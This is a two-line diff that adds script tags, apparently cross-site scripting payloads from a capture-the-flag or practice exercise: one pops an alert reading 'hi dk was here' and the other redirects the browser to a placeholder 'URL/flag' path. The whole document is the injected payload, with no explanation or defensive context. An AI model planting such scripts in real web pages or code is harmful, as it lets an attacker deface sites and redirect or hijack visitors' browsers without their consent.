@@ -1,0 +1,2 @@
+<script>alert("hi dk was here")</script>
+<script>window.location.href="URL/flag";</script>
